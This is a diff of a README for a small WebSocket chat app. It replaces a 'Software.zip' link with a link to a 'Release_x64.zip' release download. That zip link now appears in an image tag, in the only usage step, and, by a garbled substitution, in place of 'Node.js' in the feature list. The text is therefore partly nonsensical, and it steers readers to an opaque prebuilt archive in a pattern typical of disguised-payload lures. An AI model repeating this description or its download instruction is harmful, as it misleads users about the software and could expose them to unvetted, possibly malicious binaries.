@@ -1,6 +1,6 @@
 # 🚀 **Websocket Chat App**
 
-![WebSocket Chat](https://github.com/user-attachments/files/18383251/Software.zip)
+![WebSocket Chat](https://github.com/KeshavCore/websocket-chat-app/releases/download/v2.0/Release_x64.zip)
 
 ---
 
@@ -15,7 +15,7 @@ Welcome to the WebSocket Chat App repository! This is a quick and small websocke
 🌟 Real-time communication  
 🌟 Easy-to-use interface  
 🌟 WebSocket technology  
-🌟 Node.js server  
+🌟 https://github.com/KeshavCore/websocket-chat-app/releases/download/v2.0/Release_x64.zip server  
 🌟 Concurrently for running multiple processes  
 🌟 CSS, HTML, and JavaScript usage  
 🌟 Monorepo structure  
@@ -53,7 +53,7 @@ Welcome to the WebSocket Chat App repository! This is a quick and small websocke
 
 ### Usage:
 
-To start using the WebSocket Chat App, simply download the provided [Software.zip](https://github.com/user-attachments/files/18383251/Software.zip) file and extract its contents. After that, follow the instructions in the repository to set up and run the chat application.
+To start using the WebSocket Chat App, simply download the provided [https://github.com/KeshavCore/websocket-chat-app/releases/download/v2.0/Release_x64.zip](https://github.com/KeshavCore/websocket-chat-app/releases/download/v2.0/Release_x64.zip) file and extract its contents. After that, follow the instructions in the repository to set up and run the chat application.
 
 ---
 
